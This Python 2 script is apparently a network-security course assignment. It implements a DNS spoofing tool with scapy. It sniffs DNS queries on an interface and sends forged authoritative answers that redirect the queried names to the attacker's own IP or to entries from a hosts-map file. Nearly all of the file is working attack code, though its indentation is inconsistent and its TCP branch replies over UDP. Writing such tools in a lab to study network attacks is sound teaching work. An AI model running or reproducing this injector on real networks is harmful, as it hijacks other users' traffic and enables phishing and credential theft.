#https://pymotw.com/2/optparse/
#https://stackoverflow.com/questions/11735821/python-get-localhost-ip (hotname to ip)
#!/usr/bin/python


#pypcap library for default interfac?? piazaa (https://piazza.com/class/j6lyorzz9qj5i3?cid=175)
#expression wala check, expression in ip or ip in expression



from optparse import OptionParser
import netifaces as ni
import os
import socket
import pcap
from scapy.all import *


def get_ip(ifname):
    	ni.ifaddresses(ifname)
	ip = ni.ifaddresses(ifname)[ni.AF_INET][0]['addr']
	return ip  # should print "192.168.100.37"

#def injector(packet):
#    if packet.haslayer(TCP):
#        print pkt.summary()
#        print pkt.show()
#        print pkt[TCP]

def injector(pkt):
	#pkt.show()
	redirect_to=""
	#print '--------------------------------has IP----------------------------------------'
	if pkt.haslayer(IP) and pkt.haslayer(DNSQR) and pkt[DNS].aa == 0:
		#pkt.show()
		#print '--------------------------------has IP----------------------------------------'
	#if((pkt[IP].src in expression) or (expression == "")): 
		#if pkt.haslayer(DNSQR): # DNS question record
		#print 'has DNSQR'
		affectedHost = pkt[DNSQR].qname
		if options.hostsmap!=None:
			if affectedHost.rstrip('.') in mapping:	
            			redirect_to = mapping[affectedHost.rstrip('.')]
				print redirect_to	
			if(redirect_to==""):
				print redirect_to
				return
					
		else:
			redirect_to = get_ip(options.interface)
		#print 'starting spoofing'
		if pkt.haslayer(UDP):
			spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
				      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
				      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
				      an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=redirect_to))
		else:
			spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
				      UDP(dport=pkt[TCP].sport, sport=pkt[TCP].dport)/\
				      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
				      an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=redirect_to))
		#print 'spoofed'
		send(spoofed_pkt)
		#print 'Sent:', spoofed_pkt.summary()

if __name__ == '__main__':
	#expression = ""
	mapping = {}
	parser = OptionParser()
	parser.set_conflict_handler("resolve")
	parser.add_option('-i', dest="interface",default=pcap.lookupdev())
	parser.add_option('-h', dest="hostsmap")

	(options, remainder) = parser.parse_args()
	expression = remainder
	#print options.interface
	#print options.hostsmap
	#print expression
	
	if len(expression)>0:
		exp = expression[0]
	else:
		exp = ""
	#get_ip('ens33')
	print exp

	if options.hostsmap==None:
		redirect_to = get_ip(options.interface)
	else:
		redirect_to = ""
		file=open(options.hostsmap,"r")
		for line in file:
			row = line.split()
			print row
                    	mapping[row[1]]=row[0]
		print mapping
			#if affectedHost.rstrip('.') in line:	
            		#	row = line.split(" ")
	sniff(filter=exp, prn=injector, store=0, iface=options.interface)



